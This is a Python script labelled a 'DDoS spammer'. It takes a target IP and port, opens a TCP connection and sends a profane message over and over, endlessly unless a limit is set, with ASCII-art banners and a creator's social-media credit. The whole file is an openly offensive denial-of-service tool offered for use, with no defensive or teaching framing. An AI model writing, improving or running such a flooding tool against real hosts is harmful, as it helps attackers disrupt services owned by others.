import socket
import pyfiglet
import random, time
import sys
import argparse
from lib import bcolors as css
from lib import banners
random.seed(time.time())

def show(flag, color):
    src=banners[flag]
    randomindex=random.randint(0, len(src)-1)
    if src[randomindex][1]=='0':
        print(color+src[randomindex][0],css.ENDC); return
    if not src[randomindex][1]: print(pyfiglet.figlet_format(src[randomindex][0])); return
    print(color+pyfiglet.figlet_format(src[randomindex][0], font=src[randomindex][1]))
    print(css.ENDC, end='')
    print(css.WARNING+'[->] @_camillettss_ on instagram', css.ENDC)

parser=argparse.ArgumentParser(description='Spam packets to a network.', prog='DDoS spammer')
parser.add_argument('address', metavar='ip', type=str, nargs='+', help='spamming to this address')
parser.add_argument('--port', type=int, help='if not specified in the address, the server port (default=80)')
parser.add_argument('--limit', type=int, help='Max packets number to send (default=unlimited)')
args=parser.parse_args()

# startup
show('startup', css.OKGREEN)
args.address=''.join(args.address)

def spam(ip, port, M):
    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port)); i=0
    if not M:
        try:
            while True:
                sock.send(b'fuck u :)')
                print('[*] Sended '+str(i)+' packets.')
                i+=1
        except Exception as e:
            show('errors', css.FAIL)
            print(str(e))
    else:
        try:
            for _ in range(M):
                sock.send(b'fuck u :)')
                print('[*] Sended '+str(i)+' packets.')
                i+=1
            print(css.OKGREEN+'[*] Done!',css.ENDC)
        except Exception as e:
            show('errors', css.FAIL)
            print(str(e))

try:
    if not ':' in args.address:
        if not args.port:
            show('warns', css.WARNING)
            print('[!!] No port were specified, using default (80)')
            args.port=80
        else:
            pass
    else:
        args.port=int(args.address.split(':')[1])
        args.address=args.address.split(':')[0]
    print(css.OKBLUE+'[*] Spamming',args.limit,'packets to',args.address,'on port',args.port,css.ENDC)
    spam(args.address, args.port, args.limit)

except Exception as e:
    show('errors', css.FAIL)
    print(css.FAIL+'[ERROR]',str(e),css.ENDC)
    exit(code=1)